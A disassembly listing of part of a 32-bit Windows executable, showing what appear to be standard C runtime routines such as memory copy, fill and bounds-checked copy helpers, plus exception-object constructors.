  402f61:	f0 0f c1 10          	lock xadd %edx,(%eax)
  402f65:	8d 41 08             	lea    0x8(%ecx),%eax
  402f68:	c3                   	ret
  402f69:	8b c1                	mov    %ecx,%eax
  402f6b:	c3                   	ret
  402f6c:	8b ff                	mov    %edi,%edi
  402f6e:	55                   	push   %ebp
  402f6f:	8b ec                	mov    %esp,%ebp
  402f71:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
  402f75:	56                   	push   %esi
  402f76:	8b f1                	mov    %ecx,%esi
  402f78:	c7 06 64 b2 40 00    	movl   $0x40b264,(%esi)
  402f7e:	74 07                	je     0x402f87
  402f80:	56                   	push   %esi
  402f81:	e8 ed 00 00 00       	call   0x403073
  402f86:	59                   	pop    %ecx
  402f87:	8b c6                	mov    %esi,%eax
  402f89:	5e                   	pop    %esi
  402f8a:	5d                   	pop    %ebp
  402f8b:	c2 04 00             	ret    $0x4
  402f8e:	8b ff                	mov    %edi,%edi
  402f90:	55                   	push   %ebp
  402f91:	8b ec                	mov    %esp,%ebp
  402f93:	8b 45 0c             	mov    0xc(%ebp),%eax
  402f96:	8b 4d 10             	mov    0x10(%ebp),%ecx
  402f99:	83 ca ff             	or     $0xffffffff,%edx
  402f9c:	2b d0                	sub    %eax,%edx
  402f9e:	3b d1                	cmp    %ecx,%edx
  402fa0:	73 07                	jae    0x402fa9
  402fa2:	b8 16 02 07 80       	mov    $0x80070216,%eax
  402fa7:	5d                   	pop    %ebp
  402fa8:	c3                   	ret
  402fa9:	03 c1                	add    %ecx,%eax
  402fab:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402fae:	89 01                	mov    %eax,(%ecx)
  402fb0:	33 c0                	xor    %eax,%eax
  402fb2:	5d                   	pop    %ebp
  402fb3:	c3                   	ret
  402fb4:	8b ff                	mov    %edi,%edi
  402fb6:	55                   	push   %ebp
  402fb7:	8b ec                	mov    %esp,%ebp
  402fb9:	56                   	push   %esi
  402fba:	8b 75 08             	mov    0x8(%ebp),%esi
  402fbd:	57                   	push   %edi
  402fbe:	ff 75 0c             	push   0xc(%ebp)
  402fc1:	83 c6 08             	add    $0x8,%esi
  402fc4:	83 e6 f8             	and    $0xfffffff8,%esi
  402fc7:	8d 45 08             	lea    0x8(%ebp),%eax
  402fca:	56                   	push   %esi
  402fcb:	50                   	push   %eax
  402fcc:	8b f9                	mov    %ecx,%edi
  402fce:	e8 56 ff ff ff       	call   0x402f29
  402fd3:	83 c4 0c             	add    $0xc,%esp
  402fd6:	85 c0                	test   %eax,%eax
  402fd8:	78 36                	js     0x403010
  402fda:	ff 75 08             	push   0x8(%ebp)
  402fdd:	8d 45 08             	lea    0x8(%ebp),%eax
  402fe0:	6a 10                	push   $0x10
  402fe2:	50                   	push   %eax
  402fe3:	e8 a6 ff ff ff       	call   0x402f8e
  402fe8:	83 c4 0c             	add    $0xc,%esp
  402feb:	85 c0                	test   %eax,%eax
  402fed:	78 21                	js     0x403010
  402fef:	8b 4f 04             	mov    0x4(%edi),%ecx
  402ff2:	ff 75 08             	push   0x8(%ebp)
  402ff5:	8b 01                	mov    (%ecx),%eax
  402ff7:	ff 10                	call   *(%eax)
  402ff9:	85 c0                	test   %eax,%eax
  402ffb:	74 13                	je     0x403010
  402ffd:	4e                   	dec    %esi
  402ffe:	83 60 04 00          	andl   $0x0,0x4(%eax)
  403002:	89 38                	mov    %edi,(%eax)
  403004:	c7 40 0c 01 00 00 00 	movl   $0x1,0xc(%eax)
  40300b:	89 70 08             	mov    %esi,0x8(%eax)
  40300e:	eb 02                	jmp    0x403012
  403010:	33 c0                	xor    %eax,%eax
  403012:	5f                   	pop    %edi
  403013:	5e                   	pop    %esi
  403014:	5d                   	pop    %ebp
  403015:	c2 08 00             	ret    $0x8
  403018:	8b ff                	mov    %edi,%edi
  40301a:	55                   	push   %ebp
  40301b:	8b ec                	mov    %esp,%ebp
  40301d:	56                   	push   %esi
  40301e:	8b 75 0c             	mov    0xc(%ebp),%esi
  403021:	57                   	push   %edi
  403022:	ff 75 10             	push   0x10(%ebp)
  403025:	83 c6 08             	add    $0x8,%esi
  403028:	83 e6 f8             	and    $0xfffffff8,%esi
  40302b:	8d 45 0c             	lea    0xc(%ebp),%eax
  40302e:	56                   	push   %esi
  40302f:	50                   	push   %eax
  403030:	8b f9                	mov    %ecx,%edi
  403032:	e8 f2 fe ff ff       	call   0x402f29
  403037:	83 c4 0c             	add    $0xc,%esp
  40303a:	85 c0                	test   %eax,%eax
  40303c:	78 2d                	js     0x40306b
  40303e:	ff 75 0c             	push   0xc(%ebp)
  403041:	8d 45 0c             	lea    0xc(%ebp),%eax
  403044:	6a 10                	push   $0x10
  403046:	50                   	push   %eax
  403047:	e8 42 ff ff ff       	call   0x402f8e
  40304c:	83 c4 0c             	add    $0xc,%esp
  40304f:	85 c0                	test   %eax,%eax
  403051:	78 18                	js     0x40306b
  403053:	ff 75 0c             	push   0xc(%ebp)
  403056:	8b 4f 04             	mov    0x4(%edi),%ecx
  403059:	ff 75 08             	push   0x8(%ebp)
  40305c:	8b 01                	mov    (%ecx),%eax
  40305e:	ff 50 08             	call   *0x8(%eax)
  403061:	85 c0                	test   %eax,%eax
  403063:	74 06                	je     0x40306b
  403065:	4e                   	dec    %esi
  403066:	89 70 08             	mov    %esi,0x8(%eax)
  403069:	eb 02                	jmp    0x40306d
  40306b:	33 c0                	xor    %eax,%eax
  40306d:	5f                   	pop    %edi
  40306e:	5e                   	pop    %esi
  40306f:	5d                   	pop    %ebp
  403070:	c2 0c 00             	ret    $0xc
  403073:	8b ff                	mov    %edi,%edi
  403075:	55                   	push   %ebp
  403076:	8b ec                	mov    %esp,%ebp
  403078:	5d                   	pop    %ebp
  403079:	e9 2d 0b 00 00       	jmp    0x403bab
  40307e:	3b 0d b0 f0 40 00    	cmp    0x40f0b0,%ecx
  403084:	75 02                	jne    0x403088
  403086:	f3 c3                	repz ret
  403088:	e9 dd 0b 00 00       	jmp    0x403c6a
  40308d:	8b ff                	mov    %edi,%edi
  40308f:	55                   	push   %ebp
  403090:	8b ec                	mov    %esp,%ebp
  403092:	56                   	push   %esi
  403093:	8b 75 14             	mov    0x14(%ebp),%esi
  403096:	85 f6                	test   %esi,%esi
  403098:	75 04                	jne    0x40309e
  40309a:	33 c0                	xor    %eax,%eax
  40309c:	eb 61                	jmp    0x4030ff
  40309e:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  4030a2:	75 13                	jne    0x4030b7
  4030a4:	e8 04 12 00 00       	call   0x4042ad
  4030a9:	6a 16                	push   $0x16
  4030ab:	5e                   	pop    %esi
  4030ac:	89 30                	mov    %esi,(%eax)
  4030ae:	e8 a8 11 00 00       	call   0x40425b
  4030b3:	8b c6                	mov    %esi,%eax
  4030b5:	eb 48                	jmp    0x4030ff
  4030b7:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  4030bb:	74 16                	je     0x4030d3
  4030bd:	39 75 0c             	cmp    %esi,0xc(%ebp)
  4030c0:	72 11                	jb     0x4030d3
  4030c2:	56                   	push   %esi
  4030c3:	ff 75 10             	push   0x10(%ebp)
  4030c6:	ff 75 08             	push   0x8(%ebp)
  4030c9:	e8 a2 0c 00 00       	call   0x403d70
  4030ce:	83 c4 0c             	add    $0xc,%esp
  4030d1:	eb c7                	jmp    0x40309a
  4030d3:	ff 75 0c             	push   0xc(%ebp)
  4030d6:	6a 00                	push   $0x0
  4030d8:	ff 75 08             	push   0x8(%ebp)
  4030db:	e8 10 0b 00 00       	call   0x403bf0
  4030e0:	83 c4 0c             	add    $0xc,%esp
  4030e3:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  4030e7:	74 bb                	je     0x4030a4
  4030e9:	39 75 0c             	cmp    %esi,0xc(%ebp)
  4030ec:	73 0e                	jae    0x4030fc
  4030ee:	e8 ba 11 00 00       	call   0x4042ad
  4030f3:	6a 22                	push   $0x22
  4030f5:	59                   	pop    %ecx
  4030f6:	89 08                	mov    %ecx,(%eax)
  4030f8:	8b f1                	mov    %ecx,%esi
  4030fa:	eb b2                	jmp    0x4030ae
  4030fc:	6a 16                	push   $0x16
  4030fe:	58                   	pop    %eax
  4030ff:	5e                   	pop    %esi
  403100:	5d                   	pop    %ebp
  403101:	c3                   	ret
  403102:	8b ff                	mov    %edi,%edi
  403104:	51                   	push   %ecx
  403105:	c7 01 80 b2 40 00    	movl   $0x40b280,(%ecx)
  40310b:	e8 e6 11 00 00       	call   0x4042f6
  403110:	59                   	pop    %ecx
  403111:	c3                   	ret
  403112:	8b ff                	mov    %edi,%edi
  403114:	55                   	push   %ebp
  403115:	8b ec                	mov    %esp,%ebp
  403117:	56                   	push   %esi
  403118:	8b f1                	mov    %ecx,%esi
  40311a:	e8 e3 ff ff ff       	call   0x403102
  40311f:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
  403123:	74 07                	je     0x40312c
  403125:	56                   	push   %esi
  403126:	e8 48 ff ff ff       	call   0x403073
  40312b:	59                   	pop    %ecx
  40312c:	8b c6                	mov    %esi,%eax
  40312e:	5e                   	pop    %esi
  40312f:	5d                   	pop    %ebp
  403130:	c2 04 00             	ret    $0x4
  403133:	8b ff                	mov    %edi,%edi
  403135:	55                   	push   %ebp
  403136:	8b ec                	mov    %esp,%ebp
  403138:	8b 45 08             	mov    0x8(%ebp),%eax
  40313b:	83 c1 09             	add    $0x9,%ecx
  40313e:	51                   	push   %ecx
  40313f:	83 c0 09             	add    $0x9,%eax
  403142:	50                   	push   %eax
  403143:	e8 28 12 00 00       	call   0x404370
  403148:	f7 d8                	neg    %eax
  40314a:	59                   	pop    %ecx
  40314b:	1b c0                	sbb    %eax,%eax
  40314d:	59                   	pop    %ecx
  40314e:	40                   	inc    %eax
  40314f:	5d                   	pop    %ebp
  403150:	c2 04 00             	ret    $0x4
  403153:	8b ff                	mov    %edi,%edi
  403155:	55                   	push   %ebp
  403156:	8b ec                	mov    %esp,%ebp
  403158:	8b c1                	mov    %ecx,%eax
  40315a:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40315d:	c7 00 88 b2 40 00    	movl   $0x40b288,(%eax)
  403163:	8b 09                	mov    (%ecx),%ecx
  403165:	89 48 04             	mov    %ecx,0x4(%eax)
  403168:	c6 40 08 00          	movb   $0x0,0x8(%eax)
  40316c:	5d                   	pop    %ebp
  40316d:	c2 08 00             	ret    $0x8
  403170:	8b 41 04             	mov    0x4(%ecx),%eax
  403173:	85 c0                	test   %eax,%eax
  403175:	75 05                	jne    0x40317c
  403177:	b8 90 b2 40 00       	mov    $0x40b290,%eax
  40317c:	c3                   	ret
  40317d:	8b ff                	mov    %edi,%edi
  40317f:	55                   	push   %ebp
  403180:	8b ec                	mov    %esp,%ebp
  403182:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  403186:	57                   	push   %edi
  403187:	8b f9                	mov    %ecx,%edi
  403189:	74 2d                	je     0x4031b8
  40318b:	56                   	push   %esi
  40318c:	ff 75 08             	push   0x8(%ebp)
  40318f:	e8 5c 13 00 00       	call   0x4044f0
  403194:	8d 70 01             	lea    0x1(%eax),%esi
  403197:	56                   	push   %esi
  403198:	e8 ba 12 00 00       	call   0x404457
  40319d:	59                   	pop    %ecx
  40319e:	59                   	pop    %ecx
  40319f:	89 47 04             	mov    %eax,0x4(%edi)
  4031a2:	85 c0                	test   %eax,%eax
  4031a4:	74 11                	je     0x4031b7
  4031a6:	ff 75 08             	push   0x8(%ebp)
  4031a9:	56                   	push   %esi
  4031aa:	50                   	push   %eax
  4031ab:	e8 48 12 00 00       	call   0x4043f8
  4031b0:	83 c4 0c             	add    $0xc,%esp
  4031b3:	c6 47 08 01          	movb   $0x1,0x8(%edi)
  4031b7:	5e                   	pop    %esi
  4031b8:	5f                   	pop    %edi
  4031b9:	5d                   	pop    %ebp
  4031ba:	c2 04 00             	ret    $0x4
  4031bd:	8b ff                	mov    %edi,%edi
  4031bf:	56                   	push   %esi
  4031c0:	8b f1                	mov    %ecx,%esi
  4031c2:	80 7e 08 00          	cmpb   $0x0,0x8(%esi)
  4031c6:	74 09                	je     0x4031d1
  4031c8:	ff 76 04             	push   0x4(%esi)
  4031cb:	e8 db 09 00 00       	call   0x403bab
  4031d0:	59                   	pop    %ecx
  4031d1:	83 66 04 00          	andl   $0x0,0x4(%esi)
  4031d5:	c6 46 08 00          	movb   $0x0,0x8(%esi)
  4031d9:	5e                   	pop    %esi
  4031da:	c3                   	ret
  4031db:	8b ff                	mov    %edi,%edi
  4031dd:	55                   	push   %ebp
  4031de:	8b ec                	mov    %esp,%ebp
  4031e0:	8b 45 08             	mov    0x8(%ebp),%eax
  4031e3:	56                   	push   %esi
  4031e4:	8b f1                	mov    %ecx,%esi
  4031e6:	83 66 04 00          	andl   $0x0,0x4(%esi)
  4031ea:	c7 06 88 b2 40 00    	movl   $0x40b288,(%esi)
  4031f0:	c6 46 08 00          	movb   $0x0,0x8(%esi)
  4031f4:	ff 30                	push   (%eax)
  4031f6:	e8 82 ff ff ff       	call   0x40317d
  4031fb:	8b c6                	mov    %esi,%eax
  4031fd:	5e                   	pop    %esi
  4031fe:	5d                   	pop    %ebp
  4031ff:	c2 04 00             	ret    $0x4
  403202:	8b ff                	mov    %edi,%edi
  403204:	55                   	push   %ebp
  403205:	8b ec                	mov    %esp,%ebp
  403207:	56                   	push   %esi
  403208:	8b 75 08             	mov    0x8(%ebp),%esi
  40320b:	57                   	push   %edi
  40320c:	8b f9                	mov    %ecx,%edi
  40320e:	3b fe                	cmp    %esi,%edi
  403210:	74 1d                	je     0x40322f
  403212:	e8 a6 ff ff ff       	call   0x4031bd
  403217:	80 7e 08 00          	cmpb   $0x0,0x8(%esi)
  40321b:	74 0c                	je     0x403229
  40321d:	ff 76 04             	push   0x4(%esi)
  403220:	8b cf                	mov    %edi,%ecx
  403222:	e8 56 ff ff ff       	call   0x40317d
  403227:	eb 06                	jmp    0x40322f
  403229:	8b 46 04             	mov    0x4(%esi),%eax
  40322c:	89 47 04             	mov    %eax,0x4(%edi)
  40322f:	8b c7                	mov    %edi,%eax
  403231:	5f                   	pop    %edi
  403232:	5e                   	pop    %esi
  403233:	5d                   	pop    %ebp
  403234:	c2 04 00             	ret    $0x4
  403237:	c7 01 88 b2 40 00    	movl   $0x40b288,(%ecx)
  40323d:	e9 7b ff ff ff       	jmp    0x4031bd
  403242:	8b ff                	mov    %edi,%edi
  403244:	55                   	push   %ebp
  403245:	8b ec                	mov    %esp,%ebp
  403247:	56                   	push   %esi
  403248:	8b f1                	mov    %ecx,%esi
  40324a:	c7 06 88 b2 40 00    	movl   $0x40b288,(%esi)
  403250:	e8 68 ff ff ff       	call   0x4031bd
  403255:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
  403259:	74 07                	je     0x403262
  40325b:	56                   	push   %esi
  40325c:	e8 12 fe ff ff       	call   0x403073
  403261:	59                   	pop    %ecx
  403262:	8b c6                	mov    %esi,%eax
  403264:	5e                   	pop    %esi
  403265:	5d                   	pop    %ebp
  403266:	c2 04 00             	ret    $0x4
  403269:	8b ff                	mov    %edi,%edi
  40326b:	55                   	push   %ebp
  40326c:	8b ec                	mov    %esp,%ebp
  40326e:	56                   	push   %esi
  40326f:	ff 75 08             	push   0x8(%ebp)
  403272:	8b f1                	mov    %ecx,%esi
  403274:	83 66 04 00          	andl   $0x0,0x4(%esi)
  403278:	c7 06 88 b2 40 00    	movl   $0x40b288,(%esi)
  40327e:	c6 46 08 00          	movb   $0x0,0x8(%esi)
  403282:	e8 7b ff ff ff       	call   0x403202
  403287:	8b c6                	mov    %esi,%eax
  403289:	5e                   	pop    %esi
  40328a:	5d                   	pop    %ebp
  40328b:	c2 04 00             	ret    $0x4
  40328e:	8b ff                	mov    %edi,%edi
  403290:	55                   	push   %ebp
  403291:	8b ec                	mov    %esp,%ebp
  403293:	5d                   	pop    %ebp
  403294:	e9 da fd ff ff       	jmp    0x403073
  403299:	8b ff                	mov    %edi,%edi
  40329b:	55                   	push   %ebp
  40329c:	8b ec                	mov    %esp,%ebp
  40329e:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4032a1:	85 c9                	test   %ecx,%ecx
  4032a3:	74 1b                	je     0x4032c0
  4032a5:	8b 45 0c             	mov    0xc(%ebp),%eax
  4032a8:	0f b7 d0             	movzwl %ax,%edx
  4032ab:	8b c2                	mov    %edx,%eax
  4032ad:	c1 e2 10             	shl    $0x10,%edx
  4032b0:	57                   	push   %edi
  4032b1:	8b 7d 08             	mov    0x8(%ebp),%edi
  4032b4:	0b c2                	or     %edx,%eax
  4032b6:	d1 e9                	shr    $1,%ecx
  4032b8:	f3 ab                	rep stos %eax,%es:(%edi)
  4032ba:	13 c9                	adc    %ecx,%ecx
  4032bc:	66 f3 ab             	rep stos %ax,%es:(%edi)
  4032bf:	5f                   	pop    %edi
  4032c0:	8b 45 08             	mov    0x8(%ebp),%eax
  4032c3:	5d                   	pop    %ebp
  4032c4:	c3                   	ret
  4032c5:	8b ff                	mov    %edi,%edi
  4032c7:	55                   	push   %ebp
  4032c8:	8b ec                	mov    %esp,%ebp
  4032ca:	56                   	push   %esi
  4032cb:	8b 75 14             	mov    0x14(%ebp),%esi
  4032ce:	85 f6                	test   %esi,%esi
  4032d0:	75 04                	jne    0x4032d6
  4032d2:	33 c0                	xor    %eax,%eax
  4032d4:	eb 64                	jmp    0x40333a
  4032d6:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  4032da:	75 13                	jne    0x4032ef
  4032dc:	e8 cc 0f 00 00       	call   0x4042ad
  4032e1:	6a 16                	push   $0x16
  4032e3:	5e                   	pop    %esi
  4032e4:	89 30                	mov    %esi,(%eax)
  4032e6:	e8 70 0f 00 00       	call   0x40425b
  4032eb:	8b c6                	mov    %esi,%eax
  4032ed:	eb 4b                	jmp    0x40333a
  4032ef:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  4032f3:	74 19                	je     0x40330e
  4032f5:	39 75 0c             	cmp    %esi,0xc(%ebp)
  4032f8:	72 14                	jb     0x40330e
  4032fa:	8d 04 36             	lea    (%esi,%esi,1),%eax
  4032fd:	50                   	push   %eax
  4032fe:	ff 75 10             	push   0x10(%ebp)
  403301:	ff 75 08             	push   0x8(%ebp)
  403304:	e8 67 0a 00 00       	call   0x403d70
  403309:	83 c4 0c             	add    $0xc,%esp
  40330c:	eb c4                	jmp    0x4032d2
  40330e:	ff 75 0c             	push   0xc(%ebp)
  403311:	6a 00                	push   $0x0
  403313:	ff 75 08             	push   0x8(%ebp)
  403316:	e8 7e ff ff ff       	call   0x403299
  40331b:	83 c4 0c             	add    $0xc,%esp
  40331e:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  403322:	74 b8                	je     0x4032dc
  403324:	39 75 0c             	cmp    %esi,0xc(%ebp)
  403327:	73 0e                	jae    0x403337
  403329:	e8 7f 0f 00 00       	call   0x4042ad
  40332e:	6a 22                	push   $0x22
  403330:	59                   	pop    %ecx
  403331:	89 08                	mov    %ecx,(%eax)
  403333:	8b f1                	mov    %ecx,%esi
  403335:	eb af                	jmp    0x4032e6
  403337:	6a 16                	push   $0x16
  403339:	58                   	pop    %eax
  40333a:	5e                   	pop    %esi
  40333b:	5d                   	pop    %ebp
  40333c:	c3                   	ret
  40333d:	cc                   	int3
  40333e:	cc                   	int3
  40333f:	cc                   	int3
  403340:	55                   	push   %ebp
  403341:	8b ec                	mov    %esp,%ebp
  403343:	57                   	push   %edi
  403344:	56                   	push   %esi
  403345:	8b 75 0c             	mov    0xc(%ebp),%esi
  403348:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40334b:	8b 7d 08             	mov    0x8(%ebp),%edi
  40334e:	8b c1                	mov    %ecx,%eax
  403350:	8b d1                	mov    %ecx,%edx
  403352:	03 c6                	add    %esi,%eax
  403354:	3b fe                	cmp    %esi,%edi
  403356:	76 08                	jbe    0x403360
  403358:	3b f8                	cmp    %eax,%edi
  40335a:	0f 82 a0 01 00 00    	jb     0x403500
  403360:	81 f9 80 00 00 00    	cmp    $0x80,%ecx
  403366:	72 1c                	jb     0x403384
  403368:	83 3d 5c 27 41 00 00 	cmpl   $0x0,0x41275c
  40336f:	74 13                	je     0x403384
  403371:	57                   	push   %edi
  403372:	56                   	push   %esi
  403373:	83 e7 0f             	and    $0xf,%edi
  403376:	83 e6 0f             	and    $0xf,%esi
  403379:	3b fe                	cmp    %esi,%edi
  40337b:	5e                   	pop    %esi
  40337c:	5f                   	pop    %edi
  40337d:	75 05                	jne    0x403384
  40337f:	e9 f7 11 00 00       	jmp    0x40457b
  403384:	f7 c7 03 00 00 00    	test   $0x3,%edi
  40338a:	75 14                	jne    0x4033a0
  40338c:	c1 e9 02             	shr    $0x2,%ecx
  40338f:	83 e2 03             	and    $0x3,%edx
  403392:	83 f9 08             	cmp    $0x8,%ecx
  403395:	72 29                	jb     0x4033c0
  403397:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  403399:	ff 24 95 b0 34 40 00 	jmp    *0x4034b0(,%edx,4)
  4033a0:	8b c7                	mov    %edi,%eax
  4033a2:	ba 03 00 00 00       	mov    $0x3,%edx
  4033a7:	83 e9 04             	sub    $0x4,%ecx
  4033aa:	72 0c                	jb     0x4033b8
  4033ac:	83 e0 03             	and    $0x3,%eax
  4033af:	03 c8                	add    %eax,%ecx
  4033b1:	ff 24 85 c4 33 40 00 	jmp    *0x4033c4(,%eax,4)
  4033b8:	ff 24 8d c0 34 40 00 	jmp    *0x4034c0(,%ecx,4)
  4033bf:	90                   	nop
  4033c0:	ff 24 8d 44 34 40 00 	jmp    *0x403444(,%ecx,4)
  4033c7:	90                   	nop
  4033c8:	d4 33                	aam    $0x33
  4033ca:	40                   	inc    %eax
  4033cb:	00 00                	add    %al,(%eax)
  4033cd:	34 40                	xor    $0x40,%al
  4033cf:	00 24 34             	add    %ah,(%esp,%esi,1)
  4033d2:	40                   	inc    %eax
  4033d3:	00 23                	add    %ah,(%ebx)
  4033d5:	d1 8a 06 88 07 8a    	rorl   $1,-0x75f877fa(%edx)
  4033db:	46                   	inc    %esi
  4033dc:	01 88 47 01 8a 46    	add    %ecx,0x468a0147(%eax)
  4033e2:	02 c1                	add    %cl,%al
  4033e4:	e9 02 88 47 02       	jmp    0x287bbeb
  4033e9:	83 c6 03             	add    $0x3,%esi
  4033ec:	83 c7 03             	add    $0x3,%edi
  4033ef:	83 f9 08             	cmp    $0x8,%ecx
  4033f2:	72 cc                	jb     0x4033c0
  4033f4:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4033f6:	ff 24 95 b0 34 40 00 	jmp    *0x4034b0(,%edx,4)
  4033fd:	8d 49 00             	lea    0x0(%ecx),%ecx
  403400:	23 d1                	and    %ecx,%edx
  403402:	8a 06                	mov    (%esi),%al
  403404:	88 07                	mov    %al,(%edi)
  403406:	8a 46 01             	mov    0x1(%esi),%al
  403409:	c1 e9 02             	shr    $0x2,%ecx
  40340c:	88 47 01             	mov    %al,0x1(%edi)
  40340f:	83 c6 02             	add    $0x2,%esi
  403412:	83 c7 02             	add    $0x2,%edi
  403415:	83 f9 08             	cmp    $0x8,%ecx
  403418:	72 a6                	jb     0x4033c0
  40341a:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40341c:	ff 24 95 b0 34 40 00 	jmp    *0x4034b0(,%edx,4)
  403423:	90                   	nop
  403424:	23 d1                	and    %ecx,%edx
  403426:	8a 06                	mov    (%esi),%al
  403428:	88 07                	mov    %al,(%edi)
  40342a:	83 c6 01             	add    $0x1,%esi
  40342d:	c1 e9 02             	shr    $0x2,%ecx
  403430:	83 c7 01             	add    $0x1,%edi
  403433:	83 f9 08             	cmp    $0x8,%ecx
  403436:	72 88                	jb     0x4033c0
  403438:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40343a:	ff 24 95 b0 34 40 00 	jmp    *0x4034b0(,%edx,4)
  403441:	8d 49 00             	lea    0x0(%ecx),%ecx
  403444:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403445:	34 40                	xor    $0x40,%al
  403447:	00 94 34 40 00 8c 34 	add    %dl,0x348c0040(%esp,%esi,1)
  40344e:	40                   	inc    %eax
  40344f:	00 84 34 40 00 7c 34 	add    %al,0x347c0040(%esp,%esi,1)
  403456:	40                   	inc    %eax
  403457:	00 74 34 40          	add    %dh,0x40(%esp,%esi,1)
  40345b:	00 6c 34 40          	add    %ch,0x40(%esp,%esi,1)
  40345f:	00 64 34 40          	add    %ah,0x40(%esp,%esi,1)
  403463:	00 8b 44 8e e4 89    	add    %cl,-0x761b71bc(%ebx)
  403469:	44                   	inc    %esp
  40346a:	8f                   	(bad)
  40346b:	e4 8b                	in     $0x8b,%al
  40346d:	44                   	inc    %esp
  40346e:	8e e8                	mov    %eax,%gs
  403470:	89 44 8f e8          	mov    %eax,-0x18(%edi,%ecx,4)
  403474:	8b 44 8e ec          	mov    -0x14(%esi,%ecx,4),%eax
  403478:	89 44 8f ec          	mov    %eax,-0x14(%edi,%ecx,4)
  40347c:	8b 44 8e f0          	mov    -0x10(%esi,%ecx,4),%eax
  403480:	89 44 8f f0          	mov    %eax,-0x10(%edi,%ecx,4)
  403484:	8b 44 8e f4          	mov    -0xc(%esi,%ecx,4),%eax
  403488:	89 44 8f f4          	mov    %eax,-0xc(%edi,%ecx,4)
  40348c:	8b 44 8e f8          	mov    -0x8(%esi,%ecx,4),%eax
  403490:	89 44 8f f8          	mov    %eax,-0x8(%edi,%ecx,4)
  403494:	8b 44 8e fc          	mov    -0x4(%esi,%ecx,4),%eax
  403498:	89 44 8f fc          	mov    %eax,-0x4(%edi,%ecx,4)
  40349c:	8d 04 8d 00 00 00 00 	lea    0x0(,%ecx,4),%eax
  4034a3:	03 f0                	add    %eax,%esi
  4034a5:	03 f8                	add    %eax,%edi
  4034a7:	ff 24 95 b0 34 40 00 	jmp    *0x4034b0(,%edx,4)
  4034ae:	8b ff                	mov    %edi,%edi
  4034b0:	c0 34 40 00          	shlb   $0x0,(%eax,%eax,2)
  4034b4:	c8 34 40 00          	enter  $0x4034,$0x0
  4034b8:	d4 34                	aam    $0x34
  4034ba:	40                   	inc    %eax
  4034bb:	00 e8                	add    %ch,%al
  4034bd:	34 40                	xor    $0x40,%al
  4034bf:	00 8b 45 08 5e 5f    	add    %cl,0x5f5e0845(%ebx)
  4034c5:	c9                   	leave
  4034c6:	c3                   	ret
  4034c7:	90                   	nop
  4034c8:	8a 06                	mov    (%esi),%al
  4034ca:	88 07                	mov    %al,(%edi)
  4034cc:	8b 45 08             	mov    0x8(%ebp),%eax
  4034cf:	5e                   	pop    %esi
  4034d0:	5f                   	pop    %edi
  4034d1:	c9                   	leave
  4034d2:	c3                   	ret
  4034d3:	90                   	nop
  4034d4:	8a 06                	mov    (%esi),%al
  4034d6:	88 07                	mov    %al,(%edi)
  4034d8:	8a 46 01             	mov    0x1(%esi),%al
  4034db:	88 47 01             	mov    %al,0x1(%edi)
  4034de:	8b 45 08             	mov    0x8(%ebp),%eax
  4034e1:	5e                   	pop    %esi
  4034e2:	5f                   	pop    %edi
  4034e3:	c9                   	leave
  4034e4:	c3                   	ret
  4034e5:	8d 49 00             	lea    0x0(%ecx),%ecx
  4034e8:	8a 06                	mov    (%esi),%al
  4034ea:	88 07                	mov    %al,(%edi)
  4034ec:	8a 46 01             	mov    0x1(%esi),%al
  4034ef:	88 47 01             	mov    %al,0x1(%edi)
  4034f2:	8a 46 02             	mov    0x2(%esi),%al
  4034f5:	88 47 02             	mov    %al,0x2(%edi)
  4034f8:	8b 45 08             	mov    0x8(%ebp),%eax
  4034fb:	5e                   	pop    %esi
  4034fc:	5f                   	pop    %edi
  4034fd:	c9                   	leave
  4034fe:	c3                   	ret
  4034ff:	90                   	nop
  403500:	8d 74 31 fc          	lea    -0x4(%ecx,%esi,1),%esi
  403504:	8d 7c 39 fc          	lea    -0x4(%ecx,%edi,1),%edi
  403508:	f7 c7 03 00 00 00    	test   $0x3,%edi
  40350e:	75 24                	jne    0x403534
  403510:	c1 e9 02             	shr    $0x2,%ecx
  403513:	83 e2 03             	and    $0x3,%edx
  403516:	83 f9 08             	cmp    $0x8,%ecx
  403519:	72 0d                	jb     0x403528
  40351b:	fd                   	std
  40351c:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40351e:	fc                   	cld
  40351f:	ff 24 95 4c 36 40 00 	jmp    *0x40364c(,%edx,4)
  403526:	8b ff                	mov    %edi,%edi
  403528:	f7 d9                	neg    %ecx
  40352a:	ff 24 8d fc 35 40 00 	jmp    *0x4035fc(,%ecx,4)
  403531:	8d 49 00             	lea    0x0(%ecx),%ecx
  403534:	8b c7                	mov    %edi,%eax
  403536:	ba 03 00 00 00       	mov    $0x3,%edx
  40353b:	83 f9 04             	cmp    $0x4,%ecx
  40353e:	72 0c                	jb     0x40354c
  403540:	83 e0 03             	and    $0x3,%eax
  403543:	2b c8                	sub    %eax,%ecx
  403545:	ff 24 85 50 35 40 00 	jmp    *0x403550(,%eax,4)
  40354c:	ff 24 8d 4c 36 40 00 	jmp    *0x40364c(,%ecx,4)
  403553:	90                   	nop
  403554:	60                   	pusha
  403555:	35 40 00 84 35       	xor    $0x35840040,%eax
  40355a:	40                   	inc    %eax
  40355b:	00 ac 35 40 00 8a 46 	add    %ch,0x468a0040(%ebp,%esi,1)
  403562:	03 23                	add    (%ebx),%esp
  403564:	d1 88 47 03 83 ee    	rorl   $1,-0x117cfcb9(%eax)
  40356a:	01 c1                	add    %eax,%ecx
  40356c:	e9 02 83 ef 01       	jmp    0x22fb873
  403571:	83 f9 08             	cmp    $0x8,%ecx
  403574:	72 b2                	jb     0x403528
  403576:	fd                   	std
